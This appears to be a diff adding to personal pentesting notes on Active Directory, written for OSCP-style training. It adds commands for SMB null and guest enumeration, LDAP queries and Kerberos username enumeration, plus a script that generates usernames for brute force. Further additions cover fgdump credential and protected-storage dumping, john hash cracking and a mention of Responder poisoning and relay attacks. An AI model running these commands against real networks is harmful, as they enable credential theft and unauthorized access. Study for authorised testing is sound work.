@@ -1,5 +1,8 @@
 # Pentesting Active Directory
 
+[Basic Overview](#basic-overview)
+
+
 ### Cheatsheat
 
 [John Woodman's site](https://wadcoms.github.io/)
@@ -39,6 +42,184 @@ Active Directory provides several different services, which fall under the umbre
 - Rights Management – protects copyrighted information by preventing unauthorized use and distribution of digital content
 
 AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. 
+
+# Recon AD
+
+## With No Creds or Sessions
+
+### 1. Pentest the network
+
+- Scan the network, find machines, open ports. Follow the normal network methodology for this. 
+- Check printers (can be unique targets in AD) check [hacktricks guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers)
+
+ - Enumerate DNS - could give information about key servers in the domain as web, printers, shares, vpn, media, etc:
+
+```bash
+gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
+```
+### 2. Check for null and Guest access on smb services (this won't work on modern Windows versions):
+
+enum4linux
+```bash
+enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
+```
+smbmap
+```bash
+smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
+```
+smblcient
+```bash
+smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
+```
+
+
+### 3. Enumerate Ldap
+
+- Auto-enumerate with nmap:
+```bash
+
+```
+
+- Manual-enumeration with ldapsearch (can also use python to interact with api)
+
+```bash
+# ldapsearch
+# CLI utility for querying an LDAP directory.
+# More information: <https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html>.
+
+# Query an LDAP server for all items that are a member of the given group and return the object's displayName value:                                                                                                                  
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' displayName
+
+# Query an LDAP server with a no-newline password file for all items that are a member of the given group and return the object's displayName value:                                                                                  
+ldapsearch -D 'admin_DN' -y 'password_file' -h ldap_host -b base_ou 'memberOf=group1' displayName
+
+# Return 5 items that match the given filter:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -z 5 displayName
+
+# Wait up to 7 seconds for a response:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -l 7 displayName
+
+# Invert the filter:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou '(!(memberOf=group1))' displayName
+
+# Return all items that are part of multiple groups, returning the display name for each item:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(memberOf=group3))' "displayName"                                                                                                            
+
+# Return all items that are members of at least 1 of the specified groups:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName                                                                                                              
+
+# Combine multiple boolean logic filters:
+ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(!(memberOf=group3)))' displayName                             
+```
+
+
+### 4. Poison the network (dont for oscp exam)
+
+- Responder.py to gather creds
+- Access host via relay attack
+- Gather creds exposion fak UPNP srvices with Evil-SSDP
+
+### 5. OSINT
+
+- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
+
+- If you find the complete names of company workers, you could try different AD username conventions
+
+## Enumerating AD users without having Creds or Session
+
+You can use Kerberos (the AD gatekeeper) to see if a user exitist
+
+| Username is | Server Response | Server Error |
+| - | - | - |
+| Invalid | Kerberos Error:  | `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` |
+| Valid | `TGT in a AS-REP`  | - |
+| Valid | Kerberos Error: | `KRB5KDC_ERR_PREAUTH_REQUIRED` |
+
+Serveral Tools exists to help with this including nmap, msf, cme and kerbrute:
+
+```bash
+./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
+
+Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
+
+msf> use auxiliary/gather/kerberos_enumusers
+
+crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
+```
+
+If we already have first and last names the following python script can make common usernames from them:
+
+```python
+#!/usr/bin/env python3
+
+'''
+NameMash by superkojiman
+
+Generate a list of possible usernames from a person's first and last name. 
+
+https://blog.techorganic.com/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/
+'''
+
+import sys
+import os.path
+
+if __name__ == '__main__': 
+    if len(sys.argv) != 2:
+        print(f'usage: {sys.argv[0]} names.txt')
+        sys.exit(0)
+
+    if not os.path.exists(sys.argv[1]): 
+        print(f'{sys.argv[1]} not found')
+        sys.exit(0)
+
+    with open(sys.argv[1]) as f:
+        for line in enumerate(f): 
+
+            # remove anything in the name that aren't letters or spaces
+            name = ''.join([c for c in line[1] if  c == ' ' or  c.isalpha()])
+            tokens = name.lower().split()
+
+            if len(tokens) < 1: 
+                # skip empty lines
+                continue
+            
+            # assume tokens[0] is the first name
+            fname = tokens[0]
+
+            # remaining elements in tokens[] must be the last name
+            lname = ''
+
+            if len(tokens) == 2: 
+                # assume traditional first and last name
+                # e.g. John Doe
+                lname = tokens[-1]
+
+            elif len(tokens) > 2: 
+                # assume multi-barrelled surname
+                # e.g. Jane van Doe
+
+                # remove the first name
+                del tokens[0]
+
+                # combine the multi-barrelled surname
+                lname = ''.join([s for s in tokens])
+
+            # create possible usernames
+            print(fname + lname)           # johndoe
+            print(lname + fname)           # doejohn
+            print(fname + '.' + lname)     # john.doe
+            print(lname + '.' + fname)     # doe.john
+            print(lname + fname[0])        # doej
+            print(fname[0] + lname)        # jdoe
+            print(lname[0] + fname)        # djoe
+            print(fname[0] + '.' + lname)  # j.doe
+            print(lname[0] + '.' + fname)  # d.john
+            print(fname)                   # john
+            print(lname)                   # joe
+```
+
 
 # Attacking AD
 
@@ -137,7 +318,35 @@ fgdump.exe -f hostfile.txt -u AnAdministrativeUser
 
 # Dumping Many Remote Machines, Each With Its Own Username and Password
 fgdump.exe -H combofile.txt
+
+# Dumping Many Remote Machines More Efficiently
+fgdump.exe -f hostfile.txt -u AnAdministrativeUser -T 10
+
+# Dumping Hosts and Logging Output
+fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log
+
+# Dumping Hosts, Logging Output and Viewing Verbose Messages
+fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log -v -v
+
+# Dumping a Host Without Password Histories
+fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -o
+
+# Dumping a Host Without Cachedump or Pwdump Output
+fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -c (or -w for skipping pwdump)
+
+# Dumping Protected Storage
+fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -s
+
+## Protected storage can contain interesting secrets, including passwords for IE and Outlook if a user opted to have those programs remember passwords.
+
+# Cracking passwords with john
+## Passwords will usually be in username:LM_hash:NTLM_hash
+## Example:MyUser:1188:E52CAC67419A9A224A3B108F3FA6CB6D:A4F49C406510BDCAB6824EE7C30FD852:::
+## Saved to passwordhashes.txt then the command:
+./john passwordhashes.txt
 ```
+
+
 
 notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)
 
